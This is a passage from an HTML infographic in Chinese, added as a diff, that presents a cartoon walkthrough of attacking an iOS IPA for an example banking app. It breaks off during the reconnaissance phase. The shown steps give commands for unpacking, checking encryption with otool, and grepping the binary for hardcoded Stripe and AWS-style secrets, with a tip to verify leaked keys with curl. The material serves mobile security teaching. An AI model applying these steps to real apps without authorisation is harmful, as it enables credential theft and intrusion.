@@ -1,0 +1,2256 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>iOS IPA 攻击全流程 · 卡通工厂全景图</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;700;900&family=Fira+Code:wght@400;600&display=swap');
+
+:root {
+  --bg: #0f0f23;
+  --card: #1a1a2e;
+  --border: #2a2a4a;
+  --text: #e0e0e0;
+  --muted: #888;
+  --shadow: rgba(0,0,0,0.3);
+
+  --start:   #8890b0;
+  --recon:   #4d96ff;
+  --static:  #cc5de8;
+  --repack:  #ff922b;
+  --dynamic: #20c997;
+  --exploit: #ff6b6b;
+  --done:    #ffd93d;
+}
+
+* { margin:0; padding:0; box-sizing:border-box; }
+
+body {
+  font-family: 'Noto Sans SC', sans-serif;
+  background: var(--bg);
+  color: var(--text);
+  min-height: 100vh;
+  overflow-x: hidden;
+}
+
+/* ===== HEADER ===== */
+.header {
+  text-align: center;
+  padding: 50px 20px 30px;
+  background: linear-gradient(180deg, #1a1a3e 0%, var(--bg) 100%);
+}
+.header h1 {
+  font-size: 2.8em;
+  font-weight: 900;
+  margin-bottom: 8px;
+}
+.header h1 .rainbow {
+  background: linear-gradient(135deg, #4d96ff, #cc5de8, #ff922b, #20c997, #ff6b6b, #ffd93d);
+  -webkit-background-clip: text;
+  background-clip: text;
+  -webkit-text-fill-color: transparent;
+}
+.header .sub {
+  font-size: 1.05em;
+  color: var(--muted);
+}
+.header .target {
+  display: inline-block;
+  margin-top: 14px;
+  font-family: 'Fira Code', monospace;
+  font-size: 0.8em;
+  color: #ffd93d;
+  background: rgba(255,217,61,0.08);
+  border: 1px dashed rgba(255,217,61,0.35);
+  padding: 6px 16px;
+  border-radius: 20px;
+}
+
+/* ===== 图例 ===== */
+.legend {
+  max-width: 1200px;
+  margin: 20px auto 10px;
+  padding: 0 20px;
+  display: flex;
+  justify-content: center;
+  gap: 18px;
+  flex-wrap: wrap;
+}
+.legend-item {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  font-size: 0.85em;
+  font-weight: 700;
+  color: #aaa;
+}
+.legend-dot {
+  width: 14px;
+  height: 14px;
+  border-radius: 50%;
+  -webkit-border-radius: 50%;
+}
+
+/* ===== FACTORY ===== */
+.factory {
+  max-width: 1200px;
+  margin: 0 auto;
+  padding: 20px 20px 60px;
+  position: relative;
+}
+
+.factory::before {
+  content: '';
+  position: absolute;
+  left: 50%;
+  top: 0;
+  bottom: 0;
+  width: 8px;
+  transform: translateX(-50%);
+  background: linear-gradient(to bottom,
+    #8890b0 0%, #8890b0 5%,
+    #4d96ff 5%, #4d96ff 24%,
+    #cc5de8 24%, #cc5de8 47%,
+    #ff922b 47%, #ff922b 61%,
+    #20c997 61%, #20c997 84%,
+    #ff6b6b 84%, #ff6b6b 98%,
+    #ffd93d 98%, #ffd93d 100%
+  );
+  border-radius: 2px;
+  z-index: 0;
+  pointer-events: none;
+}
+
+/* ===== 大步骤分隔 ===== */
+.phase-divider {
+  position: relative;
+  z-index: 1;
+  max-width: 1200px;
+  margin: 40px auto 20px;
+  padding: 0 20px;
+}
+.phase-banner {
+  display: flex;
+  flex-direction: column;
+  gap: 6px;
+  padding: 16px 24px;
+  border-radius: 16px;
+  color: #fff;
+  box-shadow: 0 4px 20px rgba(0,0,0,0.4);
+  position: relative;
+  overflow: hidden;
+}
+.phase-divider.left .phase-banner { margin-right: 230px; }
+.phase-divider.right .phase-banner { margin-left: 230px; }
+.phase-banner .phase-title { font-weight: 900; font-size: 1.3em; }
+.phase-banner .cmd {
+  font-family: 'Fira Code', monospace;
+  font-size: 0.75em;
+  font-weight: 400;
+  background: rgba(0,0,0,0.25);
+  padding: 4px 12px;
+  border-radius: 8px;
+  letter-spacing: 0.5px;
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+  max-width: 100%;
+  align-self: flex-start;
+}
+.phase-banner.p-start   { background: linear-gradient(135deg, #8890b0, #5a6080); }
+.phase-banner.p-recon   { background: linear-gradient(135deg, #4d96ff, #2b5fc4); }
+.phase-banner.p-static  { background: linear-gradient(135deg, #cc5de8, #8a2be2); }
+.phase-banner.p-repack  { background: linear-gradient(135deg, #ff922b, #d9660a); }
+.phase-banner.p-dynamic { background: linear-gradient(135deg, #20c997, #0f8a63); }
+.phase-banner.p-exploit { background: linear-gradient(135deg, #ff6b6b, #c92a2a); }
+.phase-banner.p-done    { background: linear-gradient(135deg, #ffd93d, #e8a300); color:#1a1a2e; }
+.phase-banner.p-done .cmd { background: rgba(0,0,0,0.15); }
+
+/* ===== STAGE ROW ===== */
+.stage {
+  position: relative;
+  z-index: 2;
+  display: flex;
+  align-items: center;
+  margin-bottom: 50px;
+  gap: 20px;
+}
+.stage.right { flex-direction: row; }
+.stage.left  { flex-direction: row-reverse; }
+
+.character {
+  flex-shrink: 0;
+  width: 120px;
+  text-align: center;
+  position: relative;
+}
+.character svg {
+  width: 100px;
+  height: 130px;
+  filter: drop-shadow(0 4px 8px rgba(0,0,0,0.35));
+}
+.character .char-label {
+  font-size: 0.72em;
+  color: var(--muted);
+  margin-top: 4px;
+  font-weight: 700;
+}
+
+/* 中间连接点 */
+.connector {
+  flex-shrink: 0;
+  width: 70px;
+  min-width: 70px;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  z-index: 3;
+}
+.connector .dot {
+  width: 48px;
+  height: 48px;
+  border-radius: 50%;
+  -webkit-border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 1.4em;
+  font-weight: 900;
+  color: #fff;
+  box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+  -webkit-box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+  position: relative;
+  flex-shrink: 0;
+  animation: bounce 2.5s ease-in-out infinite;
+  -webkit-animation: bounce 2.5s ease-in-out infinite;
+}
+.connector .dot.small { font-size: 0.95em; }
+.connector .step-name {
+  font-size: 0.65em;
+  font-weight: 700;
+  margin-top: 4px;
+  text-align: center;
+  color: var(--muted);
+  max-width: 70px;
+}
+@-webkit-keyframes bounce {
+  0%,100% { -webkit-transform: translateY(0) scale(1); }
+  50% { -webkit-transform: translateY(-5px) scale(1.05); }
+}
+@keyframes bounce {
+  0%,100% { transform: translateY(0) scale(1); }
+  50% { transform: translateY(-5px) scale(1.05); }
+}
+
+/* ===== 卡片 ===== */
+.card {
+  flex: 1;
+  min-width: 0;
+  background: var(--card);
+  border: 2px solid var(--border);
+  border-radius: 20px;
+  padding: 24px 28px;
+  box-shadow: 0 6px 24px var(--shadow);
+  position: relative;
+  overflow: hidden;
+}
+.card::before {
+  content: '';
+  position: absolute;
+  top: 0; left: 0; right: 0;
+  height: 5px;
+  border-radius: 20px 20px 0 0;
+  background: var(--acc, #4d96ff);
+}
+.card h2 {
+  font-size: 1.35em;
+  font-weight: 900;
+  margin-bottom: 3px;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  flex-wrap: wrap;
+  color: #fff;
+}
+.card .en {
+  font-size: 0.48em;
+  color: var(--muted);
+  font-weight: 400;
+}
+.card .parent-tag {
+  font-size: 0.5em;
+  padding: 2px 8px;
+  border-radius: 10px;
+  color: #fff;
+  font-weight: 700;
+  vertical-align: middle;
+}
+.card .desc {
+  color: #aaa;
+  font-size: 0.88em;
+  line-height: 1.7;
+  margin-bottom: 12px;
+}
+.card .desc strong { color: #ddd; }
+
+/* ===== IO 气泡 ===== */
+.io { display: flex; gap: 10px; margin-bottom: 12px; flex-wrap: wrap; }
+.io-box {
+  flex: 1;
+  min-width: 120px;
+  padding: 9px 12px;
+  border-radius: 12px;
+  font-size: 0.8em;
+  line-height: 1.6;
+}
+.io-box.in  { background: rgba(77,150,255,0.1);  border: 1px dashed rgba(77,150,255,0.4); }
+.io-box.out { background: rgba(32,201,151,0.1);  border: 1px dashed rgba(32,201,151,0.4); }
+.io-box .tag {
+  font-weight: 900;
+  font-size: 0.72em;
+  letter-spacing: 1px;
+  margin-bottom: 2px;
+  display: block;
+}
+.io-box.in  .tag { color: #4d96ff; }
+.io-box.out .tag { color: #20c997; }
+
+/* ===== 代码块 ===== */
+.code {
+  background: #0d0d1a;
+  border: 1px solid #2a2a4a;
+  border-radius: 10px;
+  padding: 12px 14px;
+  font-family: 'Fira Code', monospace;
+  font-size: 0.76em;
+  line-height: 1.8;
+  overflow-x: auto;
+  white-space: pre;
+  color: #ccc;
+  margin-bottom: 8px;
+  position: relative;
+}
+.code .lbl {
+  position: absolute;
+  top: 5px;
+  right: 9px;
+  font-size: 0.68em;
+  color: #555;
+  font-family: 'Noto Sans SC', sans-serif;
+}
+.code .k  { color: #cc5de8; }
+.code .t  { color: #20c997; }
+.code .f  { color: #ffd93d; }
+.code .s  { color: #ff922b; }
+.code .c  { color: #555; font-style: italic; }
+.code .n  { color: #ff6b6b; }
+.code .i  { color: #74c0fc; }
+.code .p  { color: #f06595; }
+.code .r  { color: #6bcb77; }
+.code .e  { color: #ff4444; text-decoration: wavy underline; }
+.code .at { color: #ffd93d; }
+
+/* ===== 变形箭头 ===== */
+.transform-arrow {
+  text-align: center;
+  margin: 6px 0;
+  font-size: 1.1em;
+  color: var(--muted);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+}
+.transform-arrow .label {
+  font-size: 0.58em;
+  background: rgba(255,217,61,0.15);
+  color: #ffd93d;
+  padding: 2px 10px;
+  border-radius: 20px;
+  font-weight: 700;
+}
+
+/* ===== 知识点标签 ===== */
+.tips { margin-top: 6px; }
+.tip {
+  display: inline-block;
+  padding: 4px 11px;
+  border-radius: 18px;
+  font-size: 0.76em;
+  margin: 2px 2px 2px 0;
+  font-weight: 600;
+  line-height: 1.5;
+}
+.tip.info {
+  background: rgba(255,217,61,0.1);
+  color: #ffd93d;
+  border: 1px solid rgba(255,217,61,0.3);
+}
+.tip.info::before { content: '💡 '; }
+.tip.warn {
+  background: rgba(255,107,107,0.1);
+  color: #ff6b6b;
+  border: 1px solid rgba(255,107,107,0.3);
+}
+.tip.warn::before { content: '⚠️ '; }
+.tip.cmd {
+  background: rgba(32,201,151,0.1);
+  color: #20c997;
+  border: 1px solid rgba(32,201,151,0.3);
+  font-family: 'Fira Code', monospace;
+  font-size: 0.72em;
+}
+.tip.cmd::before { content: '🧪 '; }
+
+/* ===== 漫画气泡 ===== */
+.bubble {
+  position: absolute;
+  bottom: calc(100% - 6px);
+  left: 50%;
+  transform: translateX(-50%);
+  background: #252545;
+  border: 2px solid var(--border);
+  border-left: 4px solid #4d96ff;
+  border-radius: 10px;
+  padding: 6px 14px;
+  font-size: 0.78em;
+  font-weight: 700;
+  color: #fff;
+  z-index: 10;
+  white-space: nowrap;
+}
+.bubble::after {
+  content: '';
+  position: absolute;
+  bottom: -8px;
+  left: 20px;
+  width: 0; height: 0;
+  border-left: 7px solid transparent;
+  border-right: 7px solid transparent;
+  border-top: 8px solid var(--border);
+}
+
+/* ===== SUMMARY ===== */
+.summary {
+  max-width: 1200px;
+  margin: 30px auto 40px;
+  padding: 0 20px;
+}
+.summary h2 {
+  text-align: center;
+  font-size: 1.7em;
+  margin-bottom: 16px;
+  background: linear-gradient(135deg, #ff6b6b, #ffd93d);
+  -webkit-background-clip: text;
+  background-clip: text;
+  -webkit-text-fill-color: transparent;
+}
+.summary h3 {
+  text-align: center;
+  font-size: 1.15em;
+  color: #aaa;
+  margin: 34px 0 14px;
+}
+.summary table {
+  width: 100%;
+  border-collapse: collapse;
+  background: var(--card);
+  border-radius: 16px;
+  overflow: hidden;
+}
+.summary th {
+  background: #222244;
+  padding: 14px 14px;
+  text-align: left;
+  font-size: 0.88em;
+  color: #aaa;
+  font-weight: 700;
+  text-transform: uppercase;
+}
+.summary td {
+  padding: 13px 14px;
+  border-bottom: 1px solid var(--border);
+  font-size: 0.92em;
+  vertical-align: top;
+  line-height: 1.6;
+}
+.summary tr:last-child td { border-bottom: none; }
+.summary .dot {
+  display: inline-block;
+  width: 10px;
+  height: 10px;
+  border-radius: 50%;
+  -webkit-border-radius: 50%;
+  margin-right: 5px;
+  vertical-align: middle;
+}
+.summary .sev { font-weight: 900; white-space: nowrap; }
+
+/* ===== FOOTER ===== */
+.footer {
+  text-align: center;
+  padding: 25px 20px;
+  color: #444;
+  font-size: 0.8em;
+  border-top: 1px solid #2a2a4a;
+  max-width: 1200px;
+  margin: 0 auto;
+}
+
+/* ===== RESPONSIVE ===== */
+@media (max-width: 800px) {
+  .stage, .stage.left, .stage.right { flex-direction: column !important; align-items: center; }
+  .character { display: none; }
+  .connector { flex-direction: column; gap: 4px; }
+  .header h1 { font-size: 1.6em; }
+  .card { padding: 16px; max-width: 100%; min-width: auto; margin: 0 10px !important; }
+  .factory::before { display: none; }
+  .phase-divider { display: none; }
+  .legend { gap: 10px; flex-wrap: wrap; }
+  .io { flex-wrap: wrap; }
+  .tips { flex-wrap: wrap; }
+  .summary { overflow-x: auto; }
+  .summary table { min-width: 600px; }
+  .code { overflow-x: auto; }
+}
+</style>
+</head>
+<body>
+
+<div class="header">
+  <h1><span class="rainbow">iOS IPA 攻击全流程</span></h1>
+  <div class="sub">从「拿到一个安装包」到「完整攻击链闭环」的卡通工厂全景图</div>
+  <div class="target">🎯 全程追踪示例：TargetApp.ipa &nbsp;·&nbsp; com.example.bankwallet &nbsp;·&nbsp; v3.2.1</div>
+</div>
+
+<div class="legend">
+  <div class="legend-item"><span class="legend-dot" style="background:#8890b0"></span>起点</div>
+  <div class="legend-item"><span class="legend-dot" style="background:#4d96ff"></span>① 情报侦察</div>
+  <div class="legend-item"><span class="legend-dot" style="background:#cc5de8"></span>② 静态分析</div>
+  <div class="legend-item"><span class="legend-dot" style="background:#ff922b"></span>③ 重打包</div>
+  <div class="legend-item"><span class="legend-dot" style="background:#20c997"></span>④ 动态分析</div>
+  <div class="legend-item"><span class="legend-dot" style="background:#ff6b6b"></span>⑤ 攻击落地</div>
+  <div class="legend-item"><span class="legend-dot" style="background:#ffd93d"></span>★ 闭环</div>
+</div>
+
+<div class="factory">
+
+  <!-- ============ 起点 ============ -->
+  <div class="phase-divider right">
+    <div class="phase-banner p-start">
+      <div class="phase-title">📦 起点：拿到目标 IPA · Start</div>
+      <div class="cmd">$ unzip -l TargetApp.ipa</div>
+    </div>
+  </div>
+
+  <div class="stage right">
+    <div class="character">
+      <div class="bubble" style="border-left-color:#8890b0">就你了！</div>
+      <svg viewBox="0 0 100 130" xmlns="http://www.w3.org/2000/svg">
+        <line x1="50" y1="16" x2="50" y2="6" stroke="#8890b0" stroke-width="3" stroke-linecap="round"/>
+        <circle cx="50" cy="5" r="4" fill="#8890b0"/>
+        <rect x="28" y="16" width="44" height="32" rx="11" fill="#252545" stroke="#8890b0" stroke-width="3"/>
+        <circle cx="41" cy="31" r="4.5" fill="#8890b0"/><circle cx="59" cy="31" r="4.5" fill="#8890b0"/>
+        <rect x="43" y="41" width="14" height="3" rx="1.5" fill="#8890b0" opacity=".55"/>
+        <rect x="30" y="53" width="40" height="34" rx="9" fill="#8890b0" opacity=".92"/>
+        <text x="50" y="74" font-size="10" font-weight="900" text-anchor="middle" fill="#0f0f23" font-family="Fira Code,monospace">FILE</text>
+        <rect x="37" y="90" width="8" height="16" rx="4" fill="#252545" stroke="#8890b0" stroke-width="2"/>
+        <rect x="55" y="90" width="8" height="16" rx="4" fill="#252545" stroke="#8890b0" stroke-width="2"/>
+        <rect x="33" y="105" width="16" height="6" rx="3" fill="#8890b0"/><rect x="51" y="105" width="16" height="6" rx="3" fill="#8890b0"/>
+        <line x1="30" y1="64" x2="16" y2="74" stroke="#8890b0" stroke-width="4" stroke-linecap="round"/>
+        <rect x="2" y="62" width="20" height="16" rx="3" fill="none" stroke="#8890b0" stroke-width="3"/>
+        <line x1="2" y1="70" x2="22" y2="70" stroke="#8890b0" stroke-width="2"/>
+      </svg>
+      <div class="char-label">入口</div>
+    </div>
+    <div class="connector">
+      <div class="dot" style="background:linear-gradient(135deg,#8890b0,#5a6080)">S</div>
+      <div class="step-name">目标文件</div>
+    </div>
+    <div class="card" style="border-color:#8890b0; --acc:#8890b0">
+      <h2>📦 拿到目标 IPA <span class="en">Target Artifact</span> <span class="parent-tag" style="background:#8890b0">起点</span></h2>
+      <div class="desc">
+        IPA 本质就是一个 <strong>ZIP 压缩包</strong>，里面装着 Mach-O 可执行文件、资源、配置与签名。
+        攻击的第一步不是敲命令，而是搞清楚<strong>这个包从哪来</strong> —— 不同分发渠道决定了你要不要先脱壳。
+      </div>
+      <div class="io">
+        <div class="io-box in"><span class="tag">📥 输入</span>App Store / 企业签 / TestFlight / 第三方市场 拿到的 <code>.ipa</code></div>
+        <div class="io-box out"><span class="tag">📤 输出</span>一个待分析的二进制 + 一份初步攻击面假设</div>
+      </div>
+      <div class="code"><span class="lbl">攻击起点</span><span class="c"># 三种拿到 IPA 的途径，攻击难度依次递减</span>
+<span class="n">①</span> App Store 包    → 已加密（cryptid=1），<span class="e">必须先脱壳</span>
+<span class="n">②</span> 企业签/TestFlight → 通常<span class="r">未加密</span>，可直接静态分析
+<span class="n">③</span> 第三方市场/越狱源 → 可能已被他人投毒，注意反被钓鱼</div>
+      <div class="transform-arrow">⬇️ <span class="label">选定目标 · 查看包结构</span> ⬇️</div>
+      <div class="code"><span class="lbl">包结构</span>$ ls -lh TargetApp.ipa
+-rw-r--r--  1 hacker  staff   <span class="n">12M</span>  TargetApp.ipa
+
+$ unzip -l TargetApp.ipa | head -5
+  Payload/TargetApp.app/
+  Payload/TargetApp.app/<span class="i">TargetApp</span>          <span class="c">← Mach-O 主程序</span>
+  Payload/TargetApp.app/<span class="i">Info.plist</span>
+  Payload/TargetApp.app/Assets.car          <span class="c">← 资源（含隐藏资源）</span></div>
+      <div class="tips">
+        <span class="tip info">IPA = ZIP，改后缀即可解压，核心资产在 <code>Payload/*.app/</code></span>
+        <span class="tip warn">App Store 版本默认加密，不脱壳只能看到字符串表和配置</span>
+        <span class="tip cmd">unzip -l TargetApp.ipa</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ============ 大步骤 1 ============ -->
+  <div class="phase-divider right">
+    <div class="phase-banner p-recon">
+      <div class="phase-title">🔎 ① 情报侦察 · Reconnaissance</div>
+      <div class="cmd">$ unzip -o TargetApp.ipa -d ./out &amp;&amp; plutil -p Info.plist</div>
+    </div>
+  </div>
+
+  <!-- 1a -->
+  <div class="stage right">
+    <div class="character">
+      <div class="bubble" style="border-left-color:#4d96ff">拆箱！</div>
+      <svg viewBox="0 0 100 130" xmlns="http://www.w3.org/2000/svg">
+        <line x1="50" y1="16" x2="50" y2="6" stroke="#4d96ff" stroke-width="3" stroke-linecap="round"/>
+        <circle cx="50" cy="5" r="4" fill="#4d96ff"/>
+        <rect x="28" y="16" width="44" height="32" rx="11" fill="#252545" stroke="#4d96ff" stroke-width="3"/>
+        <circle cx="41" cy="31" r="4.5" fill="#4d96ff"/><circle cx="59" cy="31" r="4.5" fill="#4d96ff"/>
+        <rect x="43" y="41" width="14" height="3" rx="1.5" fill="#4d96ff" opacity=".55"/>
+        <rect x="30" y="53" width="40" height="34" rx="9" fill="#4d96ff" opacity=".92"/>
+        <text x="50" y="74" font-size="10" font-weight="900" text-anchor="middle" fill="#0f0f23" font-family="Fira Code,monospace">RECON</text>
+        <rect x="37" y="90" width="8" height="16" rx="4" fill="#252545" stroke="#4d96ff" stroke-width="2"/>
+        <rect x="55" y="90" width="8" height="16" rx="4" fill="#252545" stroke="#4d96ff" stroke-width="2"/>
+        <rect x="33" y="105" width="16" height="6" rx="3" fill="#4d96ff"/><rect x="51" y="105" width="16" height="6" rx="3" fill="#4d96ff"/>
+        <line x1="30" y1="64" x2="14" y2="72" stroke="#4d96ff" stroke-width="4" stroke-linecap="round"/>
+        <rect x="1" y="60" width="22" height="18" rx="3" fill="none" stroke="#4d96ff" stroke-width="3"/>
+        <line x1="1" y1="66" x2="23" y2="66" stroke="#4d96ff" stroke-width="2"/>
+        <line x1="11" y1="60" x2="11" y2="78" stroke="#4d96ff" stroke-width="2" opacity=".6"/>
+      </svg>
+      <div class="char-label">解包员</div>
+    </div>
+    <div class="connector">
+      <div class="dot small" style="background:#4d96ff">1a</div>
+      <div class="step-name">解包元数据</div>
+    </div>
+    <div class="card" style="border-color:#4d96ff; --acc:#4d96ff">
+      <h2>📖 解包与元数据 <span class="en">Unpack &amp; Metadata</span> <span class="parent-tag" style="background:#4d96ff">① 情报侦察</span></h2>
+      <div class="desc">
+        解压 IPA，读 <code>Info.plist</code>。这一步就能拿到 <strong>Bundle ID、版本、最低系统、URL Scheme、ATS 配置、权限声明</strong> ——
+        其中 ATS 配置直接决定后面能不能明文抓包。
+      </div>
+      <div class="io">
+        <div class="io-box in"><span class="tag">📥 输入</span>TargetApp.ipa</div>
+        <div class="io-box out"><span class="tag">📤 输出</span>完整目录树 + Info.plist 解析结果 + Bundle ID</div>
+      </div>
+      <div class="code"><span class="lbl">解包</span>$ unzip -o TargetApp.ipa -d ./out
+Payload/TargetApp.app/                     <span class="c">← 解包完成</span></div>
+      <div class="transform-arrow">⬇️ <span class="label">读取元数据</span> ⬇️</div>
+      <div class="code"><span class="lbl">Info.plist</span>
+$ plutil -p out/Payload/TargetApp.app/Info.plist
+{
+  <span class="s">"CFBundleIdentifier"</span> =&gt; <span class="s">"com.example.bankwallet"</span>   <span class="c">← 后续 hook 的入口</span>
+  <span class="s">"CFBundleShortVersionString"</span> =&gt; <span class="s">"3.2.1"</span>
+  <span class="s">"MinimumOSVersion"</span> =&gt; <span class="s">"14.0"</span>
+  <span class="s">"NSAppTransportSecurity"</span> =&gt; {
+      <span class="s">"NSAllowsArbitraryLoads"</span> =&gt; <span class="n">1</span>              <span class="e">← 全局允许明文 HTTP！</span>
+  }
+  <span class="s">"CFBundleURLTypes"</span> =&gt; [ <span class="n">7</span> 个 scheme ]
+}</div>
+      <div class="tips">
+        <span class="tip info">Bundle ID 是后续所有 Frida / objection 操作的唯一入口</span>
+        <span class="tip warn"><code>NSAllowsArbitraryLoads = 1</code> 意味着流量可被直接中间人</span>
+        <span class="tip cmd">plutil -p Info.plist</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- 1b -->
+  <div class="stage left">
+    <div class="character">
+      <div class="bubble" style="border-left-color:#4d96ff">加密没？</div>
+      <svg viewBox="0 0 100 130" xmlns="http://www.w3.org/2000/svg">
+        <line x1="50" y1="16" x2="50" y2="6" stroke="#4d96ff" stroke-width="3" stroke-linecap="round"/>
+        <circle cx="50" cy="5" r="4" fill="#4d96ff"/>
+        <rect x="28" y="16" width="44" height="32" rx="11" fill="#252545" stroke="#4d96ff" stroke-width="3"/>
+        <circle cx="41" cy="31" r="4.5" fill="#4d96ff"/><circle cx="59" cy="31" r="4.5" fill="#4d96ff"/>
+        <rect x="43" y="41" width="14" height="3" rx="1.5" fill="#4d96ff" opacity=".55"/>
+        <rect x="30" y="53" width="40" height="34" rx="9" fill="#4d96ff" opacity=".92"/>
+        <text x="50" y="74" font-size="10" font-weight="900" text-anchor="middle" fill="#0f0f23" font-family="Fira Code,monospace">BIN</text>
+        <rect x="37" y="90" width="8" height="16" rx="4" fill="#252545" stroke="#4d96ff" stroke-width="2"/>
+        <rect x="55" y="90" width="8" height="16" rx="4" fill="#252545" stroke="#4d96ff" stroke-width="2"/>
+        <rect x="33" y="105" width="16" height="6" rx="3" fill="#4d96ff"/><rect x="51" y="105" width="16" height="6" rx="3" fill="#4d96ff"/>
+        <line x1="30" y1="64" x2="18" y2="74" stroke="#4d96ff" stroke-width="4" stroke-linecap="round"/>
+        <circle cx="11" cy="80" r="9" fill="none" stroke="#4d96ff" stroke-width="3"/>
+        <line x1="4" y1="87" x2="-2" y2="94" stroke="#4d96ff" stroke-width="4" stroke-linecap="round"/>
+      </svg>
+      <div class="char-label">探伤员</div>
+    </div>
+    <div class="connector">
+      <div class="dot small" style="background:#4d96ff">1b</div>
+      <div class="step-name">二进制侦察</div>
+    </div>
+    <div class="card" style="border-color:#4d96ff; --acc:#4d96ff">
+      <h2>🔬 二进制侦察 <span class="en">Mach-O Triage</span> <span class="parent-tag" style="background:#4d96ff">① 情报侦察</span></h2>
+      <div class="desc">
+        用 <code>file</code> / <code>otool</code> 确认架构、<strong>加密状态（cryptid）</strong>、链接的动态库数量和类型。
+        cryptid 是整个静态分析流程的<strong>分水岭</strong>。
+      </div>
+      <div class="io">
+        <div class="io-box in"><span class="tag">📥 输入</span>Payload/TargetApp.app/TargetApp</div>
+        <div class="io-box out"><span class="tag">📤 输出</span>架构 / 加密状态 / 依赖库清单 / 符号信息</div>
+      </div>
+      <div class="code"><span class="lbl">终端</span>$ file Payload/TargetApp.app/TargetApp
+Mach-O <span class="n">64</span>-bit executable <span class="t">arm64</span>
+
+$ otool -l TargetApp | grep -A4 <span class="i">LC_ENCRYPTION_INFO_64</span>
+          cmd LC_ENCRYPTION_INFO_64
+      cryptoff <span class="n">16384</span>
+     cryptsize <span class="n">8388608</span>
+       cryptid <span class="n">1</span>                    <span class="e">← 1 = App Store 加密</span>
+                                  <span class="c"># 0 = 已脱壳，可直接反编译</span></div>
+      <div class="transform-arrow">⬇️ <span class="label">统计依赖规模</span> ⬇️</div>
+      <div class="code"><span class="lbl">依赖统计</span>
+$ otool -L TargetApp | wc -l
+  <span class="n">38</span>                              <span class="c">← 含 7 个第三方 SDK</span></div>
+      <div class="tips">
+        <span class="tip info"><code>cryptid 1</code> 时字符串表和 load command 仍可读，仅 <code>__TEXT</code> 代码段被加密</span>
+        <span class="tip warn">优先寻找未加密渠道包（企业签 / TestFlight），可省掉脱壳环节</span>
+        <span class="tip cmd">otool -l TargetApp | grep cryptid</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- 1c -->
+  <div class="stage right">
+    <div class="character">
+      <div class="bubble" style="border-left-color:#4d96ff">捞点料！</div>
+      <svg viewBox="0 0 100 130" xmlns="http://www.w3.org/2000/svg">
+        <line x1="50" y1="16" x2="50" y2="6" stroke="#4d96ff" stroke-width="3" stroke-linecap="round"/>
+        <circle cx="50" cy="5" r="4" fill="#4d96ff"/>
+        <rect x="28" y="16" width="44" height="32" rx="11" fill="#252545" stroke="#4d96ff" stroke-width="3"/>
+        <circle cx="41" cy="31" r="4.5" fill="#4d96ff"/><circle cx="59" cy="31" r="4.5" fill="#4d96ff"/>
+        <rect x="43" y="41" width="14" height="3" rx="1.5" fill="#4d96ff" opacity=".55"/>
+        <rect x="30" y="53" width="40" height="34" rx="9" fill="#4d96ff" opacity=".92"/>
+        <text x="50" y="74" font-size="10" font-weight="900" text-anchor="middle" fill="#0f0f23" font-family="Fira Code,monospace">STR</text>
+        <rect x="37" y="90" width="8" height="16" rx="4" fill="#252545" stroke="#4d96ff" stroke-width="2"/>
+        <rect x="55" y="90" width="8" height="16" rx="4" fill="#252545" stroke="#4d96ff" stroke-width="2"/>
+        <rect x="33" y="105" width="16" height="6" rx="3" fill="#4d96ff"/><rect x="51" y="105" width="16" height="6" rx="3" fill="#4d96ff"/>
+        <line x1="30" y1="64" x2="16" y2="74" stroke="#4d96ff" stroke-width="4" stroke-linecap="round"/>
+        <rect x="2" y="68" width="18" height="4" rx="2" fill="#4d96ff"/>
+        <line x1="4" y1="72" x2="4" y2="88" stroke="#4d96ff" stroke-width="2"/>
+        <line x1="10" y1="72" x2="10" y2="88" stroke="#4d96ff" stroke-width="2"/>
+        <line x1="16" y1="72" x2="16" y2="88" stroke="#4d96ff" stroke-width="2"/>
+      </svg>
+      <div class="char-label">梳料员</div>
+    </div>
+    <div class="connector">
+      <div class="dot small" style="background:#4d96ff">1c</div>
+      <div class="step-name">字符串速扫</div>
+    </div>
+    <div class="card" style="border-color:#4d96ff; --acc:#4d96ff">
+      <h2>🧵 字符串与敏感信息速扫 <span class="en">Strings &amp; Secret Scan</span> <span class="parent-tag" style="background:#4d96ff">① 情报侦察</span></h2>
+      <div class="desc">
+        <strong>不解密也能读字符串表</strong>。API 域名、内网 IP、UAT 环境、日志开关、开发者遗留注释，全在明文字符串里躺着。
+        这一步经常能直接挖到硬编码密钥。
+      </div>
+      <div class="io">
+        <div class="io-box in"><span class="tag">📥 输入</span>加密状态的 Mach-O</div>
+        <div class="io-box out"><span class="tag">📤 输出</span>域名清单 / 内网地址 / 疑似密钥候选</div>
+      </div>
+      <div class="code"><span class="lbl">终端</span>$ strings -a TargetApp | grep -iE <span class="s">'https?://'</span> | sort -u
+<span class="r">https://api.example.com/v1</span>
+<span class="r">https://api-uat.example.com/v1</span>      <span class="e">← UAT 环境泄露</span>
+<span class="r">http://10.20.30.41:8080/debug</span>       <span class="e">← 内网 IP + 调试端口</span>
+<span class="r">https://api.example.com/v1/admin</span>      <span class="e">← 管理接口暴露</span></div>
+      <div class="transform-arrow">⬇️ <span class="label">换关键词 · 直奔密钥</span> ⬇️</div>
+      <div class="code"><span class="lbl">密钥扫描</span>
+$ strings -a TargetApp | grep -iE <span class="s">'sk_live|AKIA|secret'</span>
+<span class="f">sk_live_51H8xQ2eZvKYlo2C8bN...</span>       <span class="e">← Stripe 生产密钥</span>
+<span class="f">AIzaSyD-9tSrke72PouQMnMX...</span>         <span class="e">← Firebase Key</span></div>
+      <div class="tips">
+        <span class="tip info">内网 IP / UAT 域名 = 从移动端打进内网的跳板</span>
+        <span class="tip warn">密钥必须<strong>实际验证有效性</strong>（curl 打一发）才算真漏洞</span>
+        <span class="tip cmd">strings -a TargetApp | grep -iE 'key|token|http'</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- 1d -->
+  <div class="stage left">
+    <div class="character">
+      <div class="bubble" style="border-left-color:#4d96ff">画张地图</div>
